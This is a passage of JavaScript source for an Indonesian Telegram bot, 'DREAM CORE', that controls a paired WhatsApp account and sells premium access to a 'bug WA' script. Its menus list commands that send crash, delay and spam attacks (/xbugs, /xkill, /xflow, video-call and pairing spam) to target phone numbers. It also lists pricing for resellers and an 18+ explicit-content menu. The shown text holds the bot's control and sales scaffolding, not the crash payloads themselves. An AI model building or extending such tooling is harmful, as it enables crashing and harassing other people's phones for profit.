⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


» Information:
  Developer: @Kayrosukamieayam
  Version: 1.0  
  Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


» Information:
  Developer: @Kayrosukamieayam
  Version: 1.0  
  Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

// Sender management commands
bot.command("connect", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /connect 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
⬡ Number: ${phoneNumber}
⬡ Pairing Code: ${formattedCode}
⬡ Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(vidthumbnail, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
⬡ Number: ${lastPairingMessage.phoneNumber}
⬡ Pairing Code: ${lastPairingMessage.pairingCode}
⬡ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.start(async (ctx) => {

    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const menuMessage = `
\`\`\`javascript
━━━━━━━━━━━━━━━━━━
     𝗧𝗢𝗞𝗘𝗡 𝗩𝗔𝗟𝗜𝗗
━━━━━━━━━━━━━━━━━━
𝗜𝗡𝗙𝗢𝗠𝗔𝗦𝗜 𝗦𝗖𝗥𝗜𝗣𝗧
𖤐 Developer     :: @Kayrosukamieayam
𖤐 Module        :: Telegram 
𖤐 Status Sender :: ${senderStatus}
𖤐 Version       :: 1.0
𖤐 Stintaksis    :: Javascript
━━━━━━━━━━━━━━━━━━
𝗦𝗞𝗜𝗟𝗦 𝗘𝗙𝗙𝗘𝗖𝗧 
• Delay Spam
• Bulldozer X Delay
• Blank Andro
• Dan lain lain
━━━━━━━━━━━━━━━━━━
𝗣𝗥𝗜𝗖𝗘 𝗦𝗖𝗥𝗜𝗣𝗧
Full Update : 5000
Reseller     : 15,000
━━━━━━━━━━━━━━━━━━

𝘚𝘤𝘳𝘪𝘱𝘵 𝘣𝘶𝘨 𝘸𝘢 
𝘣𝘦𝘳𝘬𝘶𝘢𝘭𝘪𝘵𝘢𝘴 • 𝘱𝘳𝘦𝘮𝘪𝘶𝘮 𝘧𝘦𝘢𝘵𝘶𝘳𝘦  • 𝘩𝘪𝘨𝘩 𝘦𝘧𝘧𝘦𝘤𝘵
𝘸𝘢𝘭𝘢𝘶𝘱𝘶𝘯 𝘮𝘶𝘳𝘢𝘩 𝘬𝘶𝘢𝘭𝘪𝘵𝘢s 𝘢𝘯𝘵𝘪 𝘮𝘶𝘳𝘢𝘩𝘢𝘯

━━━━━━━━━━━━━━━━━━

× CLICK BUTTON DI BAWAH UNTUK
MENDAPATKAN MENU TAMPILAN UTAMA
PADA SCRIPT INI !\`\`\`
`;

    const keyboard = [
        [
        {
            text: "(ᯓ) BUKA MENU SCRIPT",
                callback_data: "/start",
                style: "success",icon_custom_emoji_id:"4956726373679891220"
        },        
    ]
];

    return ctx.replyWithPhoto(vidthumbnail, {
        caption: menuMessage,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
 
const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `
\`\`\`javascript
━━━━━━━━━━━━━━━━━━

𑁍┊DREAM CORE         
━━━━━━━━━━━━━━━━━━━━━━━
INFORMATION DREAM CORE 
━━━━━━━━━━━━━━━━━━━━━━━
𖤐 Developer     :: @Kayrosukamieayam
𖤐 Module        :: Telegram 
𖤐 Status Sender :: ${senderStatus}
𖤐 Version       :: 1.0
𖤐 Stintaksis    :: Javascript
━━━━━━━━━━━━━━━━━━━━━━━
Everything is nothing 
━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
`;

    const keyboard = [
        [
        {
            text: "༑𝐎͢𝐰͡𝐧𝐞͜𝐫⍣᳟𝐌͜𝐞͢𝐧͡𝐮꙳⟅",
                callback_data: "/controls",
                style: "success",icon_custom_emoji_id:"5927116114713644570"
        },
        {
            text: "༑𝐓͢𝐨͡𝐨͜𝐥͢𝐬⍣᳟𝐌͜𝐞͢𝐧͡𝐮꙳⟅",
                callback_data: "/tools",
                style: "danger",icon_custom_emoji_id:"5927116114713644570"
                
        },
        {
            text: "༑𝐁͢𝐮͡𝐠𝐬⍣᳟𝐌͜𝐞͢𝐧͡𝐮꙳⟅",
                callback_data: "/bug",
                style: "primary",icon_custom_emoji_id:"4956420911310832630"
                
        }
    ],
    [
        {
            text: "༑𝐃͢𝐞͡𝐯𝐞͜𝐥𝐨𝐩𝐞͢𝐫⍣᳟𝐒𝐜𝐫𝐢𝐩𝐭꙳⟅",
                url: "https://t.me/Kayrosukamieayam",
                style: "danger",icon_custom_emoji_id:"4956726373679891220"
        }
    ],
    [
        {
            text: "༑𝐈͢𝐧͡𝐟𝐨𝐫͢𝐦𝐚𝐬𝐢⍣᳟𝐒𝐜𝐫𝐢𝐩𝐭꙳⟅",
                url: "https://t.me/Officialkayrochannel",
                style: "danger",icon_custom_emoji_id:"4956726373679891220"
        }
    ],
    [
        {
            text: "༑𝟷͢𝟾͡+⍣᳟𝐌͜𝐞͢𝐧͡𝐮꙳⟅",
            callback_data: "/asupan",
            style: "success",icon_custom_emoji_id:"5927116114713644570"
        },
        {
            text: "༑𝐀͢𝐥͡𝐥⍣᳟𝐌͜𝐞͢𝐧͡𝐮꙳⟅",
                callback_data: "/all",
                style: "danger",icon_custom_emoji_id:"5927116114713644570"
        },
        {
            text: "༑𝐓͢𝐚͡𝐧𝐠𝐤͜𝐬⍣᳟𝐓𝐨𝐨꙳⟅",
                callback_data: "/tqto",
                style: "primary",icon_custom_emoji_id:"5927116114713644570"
        }
    ]
];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: vidthumbnail,
            caption: menuMessage,
            parse_mode: "Markdown",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
\`\`\`javascript
⚙ ACCESS CONTROL
✦━━━━━━━━━━━━━━✦
➤ /addgcpremium → Add Premium Group
➤ /delgcpremium → Del Premium Group
➤ /addpremium   → Add Premium Users
➤ /delpremium   → Delete Premium Users
➤ /setcooldown  → Set Cooldown Bugs
➤ /connect      → Add Sender Number
➤ /resetsession → Reset Existing Session
➤ /update → Update script Coyyy
✦━━━━━━━━━━━━━━✦\`\`\`
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ メインページ ",
                callback_data: "/start",
                style: "primary",icon_custom_emoji_id:"5927116114713644570"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/asupan', async (ctx) => {
    const asupanMenu = `
\`\`\`javascript
👄 ASUPAN 18+
✦━━━━━━━━━━━━━━✦
(⚔) /videobkp  ⇢ get random video 18+
(⚔) /hentai    ⇢ get image asupan random anime
(⚔) /animbrat  ⇢ Anime Berat
(⚔) /waifu     ⇢ Looking for Your Anime Waifu
(⚔) /anime     ⇢ anime will
✦━━━━━━━━━━━━━━✦
𝘧𝘪𝘵𝘶𝘳 𝘥𝘪 𝘢𝘵𝘢𝘴 𝘮𝘦𝘳𝘶𝘱𝘢𝘬𝘢𝘯 𝘧𝘪𝘵𝘶𝘳 18+ 𝘺𝘢𝘯𝘨 𝘵𝘪𝘥𝘢𝘬 𝘱𝘢𝘯𝘵𝘢𝘴 𝘥𝘪 𝘵𝘰𝘯𝘵𝘰𝘯.
𝘩𝘢𝘳𝘢𝘱 𝘥𝘪 𝘫𝘢𝘨𝘢 𝘬𝘦𝘵𝘢𝘵 𝘢𝘨𝘢𝘳 𝘵𝘪𝘥𝘢𝘬 𝘵𝘦𝘳𝘫𝘢𝘥𝘪 𝘴𝘦𝘴𝘶𝘢𝘵𝘶 𝘺𝘢𝘯𝘨 𝘵𝘪𝘥𝘢𝘬 𝘥𝘪 𝘪𝘯𝘨𝘪𝘯𝘬𝘢𝘯.
𝘨𝘶𝘯𝘢𝘬𝘢𝘯 𝘤𝘮𝘥 𝘥𝘪 𝘢𝘵𝘢𝘴 𝘥𝘦𝘯𝘨𝘢𝘯 𝘣𝘢𝘪𝘬 𝘥𝘢𝘯 𝘥𝘰𝘴𝘢 𝘥𝘪 𝘵𝘢𝘯𝘨𝘨𝘶𝘯𝘨 𝘴𝘦𝘯𝘥𝘪𝘳𝘪 𝘺𝘢𝘢!!.
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
 `;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ メインページ ",
                callback_data: "/start",
                style: "success",icon_custom_emoji_id:"4956420911310832630"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(asupanMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error editMessageCaption (asupan):", error);
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
\`\`\`javascript
╭━━━〔 ALL FITURE • BEBAS SPAM?MYBE  〕━━━╮

📱 ANDROID • BUGS ✦
│ /xbugs      ➜ 628xxxx
│ /xkill      ➜ 628xxxx
│ /xynerx     ➜ 628xxxx
│ /zypherx    ➜ 628xxxx

🍏 IOS • BUGS ✦
│ /xflow     ➜ 628xxxx
│ /xenon      ➜ 628xxxx

GW BLM DAPET NOKOS AND FUNC BARU JADI BLM TAU WORK ATAU KAGA TRY AJA , by @Kayrosukamieayam
━━━━━━━━━━━━━━━━━━━━━━\`\`\`
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ メインページ ",
                callback_data: "/start",
                style: "primary",icon_custom_emoji_id:"4956726373679891220"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bugv2', async (ctx) => {
    const bugMenu = `
\`\`\`javascript
[ 🌌 ] - Dream - Crasher
─ 「 ⚚ 」こんにちは, ${ctx.from.first_name} 私はバグの世界であなたを助けるDarkです。無実の人々にそれをしないでください.

「 ⚡ 」 「 𝐒𝐜𝐫𝐢𝐩𝐭 ⵢ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧  ꑭ 」
✧ Name Script : Dream Crash<
✧ Devoloper : @Kayrosukamieayam
✧ Version : 𝟏𝟔.𝟎.𝟎°𝐕𝐢𝐩!
✧ Prefix : / [ Slash ]
✧ Username : ${ctx.from.first_name}

[ ✨ ] - Dark Buk Spam
ﾒ.- /forcelo - Spam Pair
ﾒ.- /delaybulldo - Spam Video Call\`\`\`
 `;

    const keyboard = [
        [
        {
                text: "⌜🔙⌟ メインページ ",
                callback_data: "/bug"
            }
        ]
    ];

    try {
